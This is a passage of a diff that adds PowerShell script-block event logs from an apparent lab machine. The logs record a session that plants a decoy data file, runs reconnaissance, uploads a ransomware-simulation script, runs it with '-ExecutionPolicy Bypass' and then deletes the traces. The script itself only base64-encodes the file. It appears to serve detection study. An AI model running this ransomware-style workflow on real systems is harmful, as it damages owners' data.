+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:24:20.756+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('RGF5IGxhIGR1IGxpZXUgcXVhbiB0cm9uZyBjdWEgY29uZyB0eSAhIHZ1aSBsb25nIGtob25nIHBoYXQgdGFuIHJhIGJlbiBuZ29haS4=')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('RGF5IGxhIGR1IGxpZXUgcXVhbiB0cm9uZyBjdWEgY29uZyB0eSAhIHZ1aSBsb25nIGtob25nIHBoYXQgdGFuIHJhIGJlbiBuZ29haS4=')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:24:20.792+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:24:20.821+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:34:39.128+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:34:42.815+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:34:45.711+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:34:47.750+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","whoami
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+whoami
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:34:47.764+0000","1
+1","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","""C:\Windows\system32\whoami.exe""
+""C:\Windows\system32\whoami.exe""","null
+null"
+"2025-11-16T07:34:54.029+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:34:55.288+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:34:59.824+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:06.581+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'Program Files
+'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'Program Files
+'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:09.877+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:22.607+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","rm data_important.txt.encrypted
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+rm data_important.txt.encrypted
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:29.413+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cat data_important.txt
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cat data_important.txt
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:41.721+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-item 'C:\Program Files\data_important.txt').length
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-item 'C:\Program Files\data_important.txt').length
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:42.077+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 0
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 0
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:42.533+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 77
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$p = $ExecutionContext.SessionState.Path
+$path = $p.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\data_important.txt"")
+$index = 77
+$chunkSize = 1048576
+if (Test-Path $path -PathType Leaf) {
+  $file = [System.IO.File]::OpenRead($path)
+  $seekedTo = $file.Seek($index, [System.IO.SeekOrigin]::Begin)
+  $chunk = New-Object byte[] $chunkSize
+  $bytesRead = $file.Read($chunk, 0, $chunkSize)
+  $bytes = [System.convert]::ToBase64String($chunk[0..$bytesRead])
+  Write-Host $bytes
+  exit 0
+}
+ElseIf (Test-Path $path -PathType Container) {
+  exit 2
+}
+exit 1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:42.669+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:54.812+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$hash_file = @{
+  ""7b9fb1977f73c7229b9e9394a58ce346d746ff6a"" = @{
+    ""target"" = ""C:\Program Files\encrypt.ps1"";
+    ""src_basename"" = ""encrypt.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$hash_file = @{
+  ""7b9fb1977f73c7229b9e9394a58ce346d746ff6a"" = @{
+    ""target"" = ""C:\Program Files\encrypt.ps1"";
+    ""src_basename"" = ""encrypt.ps1"";
+    ""dst"" = ""C:\Program Files\encrypt.ps1""
+  }
+}
+
+Function Cleanup($disposable) {
+  if (($disposable -ne $null) -and ($disposable.GetType().GetMethod(""Dispose"") -ne $null)) {
+    $disposable.Dispose()
+  }
+}
+
+Function Check-Files($h) {
+  return $h.GetEnumerator() | ForEach-Object {
+    $dst = Unresolve-Path $_.Value.target
+    $dst_changed = $false
+    if(Test-Path $dst -PathType Container) {
+      $dst_changed = $true
+      $dst = Join-Path $dst $_.Value.src_basename
+    }
+    New-Object psobject -Property @{
+      chk_exists = ($exists = Test-Path $dst -PathType Leaf)
+      src_sha1 = ($sMd5 = $_.Key)
+      dst_sha1 = ($dMd5 = if ($exists) { Get-SHA1Sum $dst } else { $null })
+      chk_dirty = ($dirty = if ($sMd5 -ne $dMd5) { $true } else { $false })
+      verifies = if ($dirty -eq $false) { $true } else { $false }
+      target_is_folder = $dst_changed
+    }
+  } | Select-Object -Property chk_exists,src_sha1,dst_sha1,chk_dirty,verifies,target_is_folder
+}
+
+Function Get-SHA1Sum($src) {
+  Try {
+    $c = [System.Security.Cryptography.SHA1]::Create()
+    $bytes = $c.ComputeHash(($in = (Get-Item $src).OpenRead()))
+    return ([System.BitConverter]::ToString($bytes)).Replace(""-"", """").ToLower()
+  } 
+  Finally {
+    Cleanup $c
+    Cleanup $in
+  }
+}
+
+Function Unresolve-Path($path) {
+  if ($path -eq $null) {
+    return $null
+  }
+  else {
+    return $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
+  }
+}
+
+Check-Files $hash_file | ConvertTo-Csv -NoTypeInformation
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:54.966+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            $to = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath(""C:\Program Files\encrypt.ps1"")
+            $parent = Split-Path $to
+            if(!(Test-path $parent)) { mkdir $parent | Out-Null }
+            $fileStream = New-Object -TypeName System.IO.FileStream -ArgumentList @(
+                $to,
+                [system.io.filemode]::Create,
+                [System.io.FileAccess]::Write,
+                [System.IO.FileShare]::ReadWrite
+            )
+            # Powershell caches ScrpitBlocks in a dictionary
+            # keyed on the script block text. Thats just great
+            # unless the script is super large and called a gillion
+            # times like we might do. In such a case it will saturate the
+            # Large Object Heap and lead to Out Of Memory exceptions
+            # for large files or folders. So we call the internal method
+            # ClearScriptBlockCache to clear it.
+            $bindingFlags= [Reflection.BindingFlags] ""NonPublic,Static""
+            $method = [scriptblock].GetMethod(""ClearScriptBlockCache"", $bindingFlags)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:55.051+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSByYSBmaWxlIC5lbmNyeXB0ZWQgTeG7mkkKIyBRVUFOIFRS4buMTkc6IEtow7RuZyB4w7NhIGhheSB0aGF5IMSR4buVaSBmaWxlIGfhu5FjLgoKcGFyYW0gKAogICAgIyBOaOG6rW4gdGhhbSBz4buRIGzDoCDEkcaw4budbmcgZOG6q24gZmlsZSBt4bulYyB0acOqdQogICAgW3N0cmluZ10kUGF0aCA9ICJDOlxQcm9ncmFtIEZpbGVzXGRhdGFfaW1wb3J0YW50LnR4dCIKKQoKdHJ5IHsKICAgIFdyaXRlLUhvc3QgIlsqXSBCYXQgZGF1IG1vIHBob25nLi4uIERvYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaWVtIHRyYSBmaWxlIHRvbiB0YWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkxvaTogS2hvbmcgdGltIHRoYXkgZmlsZSBtdWMgdGlldTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgRG9jIG5vaSBkdW5nIGZpbGUKICAgICRjb250ZW50Qnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAKICAgICMgTWEgaG9hIEJhc2U2NCAobW8gcGhvbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIERpbmggbmdoaWEgdGVuIGZpbGUgbW9pCiAgICAkbmV3RW5jcnlwdGVkUGF0aCA9ICRQYXRoICsgIi5lbmNyeXB0ZWQiCiAgICAKICAgICMgR2hpIG5vaSBkdW5nIGRhICJtYSBob2EiIHJhIGZpbGUgbW9pCiAgICBTZXQtQ29udGVudCAtUGF0aCAkbmV3RW5jcnlwdGVkUGF0aCAtVmFsdWUgJGJhc2U2NENvbnRlbnQKICAgIAogICAgV3JpdGUtSG9zdCAiWytdIFRoYW5oIGNvbmchIERhIG1vIHBob25nIG1hIGhvYSBmaWxlLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGdvYyB2YW4gYW4gdG9hbjogJFBhdGgiCiAgICBXcml0ZS1Ib3N0ICJbK10gRmlsZSBtb2kgZGEgdGFvOiAkbmV3RW5jcnlwdGVkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkdhcCBsb2k6ICRfLkV4Y2VwdGlvbi5NZXNzYWdlIgp9Cg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+            if($method) { $method.Invoke($Null, $Null) }
+            $bytes=[Convert]::FromBase64String('IyBzaW11bGF0ZV9lbmNyeXB0LnBzMQojIE3hu6VjIHRpw6p1OiBNw7QgcGjhu49uZyBow6BuaCB2aSByYW5zb213YXJlIG3hu5l0IGPDoWNoIGFuIHRvw6BuIGNobyBsYWIKIyBIw6BuaCDEkeG7mW5nOiDEkOG7jWMgZmlsZSB0YXJnZXQsIGVuY29kZSBCYXNlNjQsIGdoaSByYSBmaWxlIC5lbmNyeXB0ZWQgTeG7mkkKIyBRVUFOIFRS4buMTkc6IEtow7RuZyB4w7NhIGhheSB0aGF5IMSR4buVaSBmaWxlIGfhu5FjLgoKcGFyYW0gKAogICAgIyBOaOG6rW4gdGhhbSBz4buRIGzDoCDEkcaw4budbmcgZOG6q24gZmlsZSBt4bulYyB0acOqdQogICAgW3N0cmluZ10kUGF0aCA9ICJDOlxQcm9ncmFtIEZpbGVzXGRhdGFfaW1wb3J0YW50LnR4dCIKKQoKdHJ5IHsKICAgIFdyaXRlLUhvc3QgIlsqXSBCYXQgZGF1IG1vIHBob25nLi4uIERvYyBmaWxlOiAkUGF0aCIKICAgIAogICAgIyBLaWVtIHRyYSBmaWxlIHRvbiB0YWkKICAgIGlmICgtbm90IChUZXN0LVBhdGggJFBhdGgpKSB7CiAgICAgICAgV3JpdGUtRXJyb3IgIkxvaTogS2hvbmcgdGltIHRoYXkgZmlsZSBtdWMgdGlldTogJFBhdGgiCiAgICAgICAgZXhpdAogICAgfQoKICAgICMgRG9jIG5vaSBkdW5nIGZpbGUKICAgICRjb250ZW50Qnl0ZXMgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0ZXMoJFBhdGgpCiAgICAKICAgICMgTWEgaG9hIEJhc2U2NCAobW8gcGhvbmcgJ2VuY3J5cHRpb24nKQogICAgJGJhc2U2NENvbnRlbnQgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkY29udGVudEJ5dGVzKQogICAgCiAgICAjIERpbmggbmdoaWEgdGVuIGZpbGUgbW9pCiAgICAkbmV3RW5jcnlwdGVkUGF0aCA9ICRQYXRoICsgIi5lbmNyeXB0ZWQiCiAgICAKICAgICMgR2hpIG5vaSBkdW5nIGRhICJtYSBob2EiIHJhIGZpbGUgbW9pCiAgICBTZXQtQ29udGVudCAtUGF0aCAkbmV3RW5jcnlwdGVkUGF0aCAtVmFsdWUgJGJhc2U2NENvbnRlbnQKICAgIAogICAgV3JpdGUtSG9zdCAiWytdIFRoYW5oIGNvbmchIERhIG1vIHBob25nIG1hIGhvYSBmaWxlLiIKICAgIFdyaXRlLUhvc3QgIlsrXSBGaWxlIGdvYyB2YW4gYW4gdG9hbjogJFBhdGgiCiAgICBXcml0ZS1Ib3N0ICJbK10gRmlsZSBtb2kgZGEgdGFvOiAkbmV3RW5jcnlwdGVkUGF0aCIKCn0gY2F0Y2ggewogICAgV3JpdGUtRXJyb3IgIkdhcCBsb2k6ICRfLkV4Y2VwdGlvbi5NZXNzYWdlIgp9Cg==')
+            $fileStream.Write($bytes, 0, $bytes.length)
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:35:55.115+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+$fileStream.Dispose()
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:36:03.087+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+powershell -ExecutionPolicy Bypass -File .\encrypt.ps1
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:36:03.615+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi ra file .encrypted Má»šI
+# QUAN TRá»ŒNG: KhÃ´ng xÃ³a hay thay Ä‘á»•i file gá»‘c.
+
+param (
+    # Nháº­n tham sá»‘ lÃ  Ä‘Æ°á»ng dáº«n file má»¥c tiÃªu
+    [string]$Path = ""C:\Program Files\data_important.txt""
+)
+
+try {
+    Write-Host ""[*] Bat dau mo phong... Doc file: $Path""
+    
+    # Kiem tra file ton tai
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Loi: Khong tim thay file muc tieu: $Path""
+        exit
+    }
+
+    # Doc noi dung file
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Ma hoa Base64 (mo phong 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Dinh nghia ten file moi
+    $newEncryptedPath = $Path + "".encrypted""
+    
+    # Ghi noi dung da ""ma hoa"" ra file moi
+    Set-Content -Path $newEncryptedPath -Value $base64Content
+    
+    Write-Host ""[+] Thanh cong! Da mo phong ma hoa file.""
+    Write-Host ""[+] File goc van an toan: $Path""
+    Write-Host ""[+] File moi da tao: $newEncryptedPath""
+
+} catch {
+    Write-Error ""Gap loi: $_.Exception.Message""
+}
+# simulate_encrypt.ps1
+# Má»¥c tiÃªu: MÃ´ phá»ng hÃ nh vi ransomware má»™t cÃ¡ch an toÃ n cho lab
+# HÃ nh Ä‘á»™ng: Äá»c file target, encode Base64, ghi ra file .encrypted Má»šI
+# QUAN TRá»ŒNG: KhÃ´ng xÃ³a hay thay Ä‘á»•i file gá»‘c.
+
+param (
+    # Nháº­n tham sá»‘ lÃ  Ä‘Æ°á»ng dáº«n file má»¥c tiÃªu
+    [string]$Path = ""C:\Program Files\data_important.txt""
+)
+
+try {
+    Write-Host ""[*] Bat dau mo phong... Doc file: $Path""
+    
+    # Kiem tra file ton tai
+    if (-not (Test-Path $Path)) {
+        Write-Error ""Loi: Khong tim thay file muc tieu: $Path""
+        exit
+    }
+
+    # Doc noi dung file
+    $contentBytes = [System.IO.File]::ReadAllBytes($Path)
+    
+    # Ma hoa Base64 (mo phong 'encryption')
+    $base64Content = [System.Convert]::ToBase64String($contentBytes)
+    
+    # Dinh nghia ten file moi
+    $newEncryptedPath = $Path + "".encrypted""
+    
+    # Ghi noi dung da ""ma hoa"" ra file moi
+    Set-Content -Path $newEncryptedPath -Value $base64Content
+    
+    Write-Host ""[+] Thanh cong! Da mo phong ma hoa file.""
+    Write-Host ""[+] File goc van an toan: $Path""
+    Write-Host ""[+] File moi da tao: $newEncryptedPath""
+
+} catch {
+    Write-Error ""Gap loi: $_.Exception.Message""
+}"
+"2025-11-16T07:36:14.610+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","rm encrypt.ps1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+rm encrypt.ps1
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:36:21.479+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","rm data_important.txt
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+rm data_important.txt
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T07:36:25.005+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+exit
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:00:07.639+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+(get-location).path
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:00:10.177+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:00:13.805+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd ../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd ../
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:00:19.148+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+ls
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:00:29.226+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }
+cd 'Program Files'
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+"2025-11-16T08:04:14.363+0000","4104
+4104","DESKTOP-00OJS0K
+DESKTOP-00OJS0K","null
+null","@'
+# decrypt.ps1
+# SCRIPT GIẢI MÃ KÉP (Double Decode) cho Base64 + Unicode
+
+param(
+    # Tham số 1: Đường dẫn file mục tiêu (.encrypted)
+    [Parameter(Mandatory=$false)]
+    [string]$EncryptedPath,
+
